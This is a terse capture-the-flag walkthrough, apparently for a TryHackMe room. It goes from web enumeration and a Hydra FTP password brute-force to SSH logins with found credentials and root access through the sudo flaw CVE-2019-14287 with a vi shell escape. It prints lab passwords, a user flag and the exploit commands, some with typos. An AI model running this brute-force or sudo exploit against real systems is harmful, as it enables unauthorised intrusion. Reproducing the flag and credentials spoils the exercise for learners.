# Gobuster

So there's a directory /assets, and there's a file /style.css with following comment:
```css
/* Nice to see someone checking the stylesheets.
   Take a look at the page: /sup3r_s3cr3t_fl4g.php
*/
```

We need to disable JS to reach this page

Rick Roll is just Rick Roll...

Found directory `hidden_directory=/WExYY2Cv-qU` bu BURP and then picture `Hot-Babe`

Just by reading picture as text, we have our user `ftpuser` and passwords dictionary

# Hydra

```bash
hydra -l ftpuser -P passes.txt ftp://10.10.93.197
```

pass: 5iez1wGXKfPKQ

# Ftp

```bash
get Eli's_Creds.txt
```

Brainfuck language decode: 

```
User: eli

Password: DSpDiM1wAEwid
```

# SSH

Looks like we have new usernames: root and gwendoline

```bash
locate s3cr3t
cat /usr/games/s3cr3t/.th1s_m3ss4ag3_15_f0r_gw3nd0l1n3_0nly!
```
New Credentials: 
gwendoline:MniVCQVhQHUNI

```bash
cat /home/gwendoline/user.txt
```

User.txt: THM{1107174691af9ff3681d2b5bdb5740b1589bae53}

# Getting root

CVE-2019-14287

```bash
root -u#-1 /bin/vi /home/hwendoline/user.txt
```
Then in VIM:
:!/bin/sh

And now you are root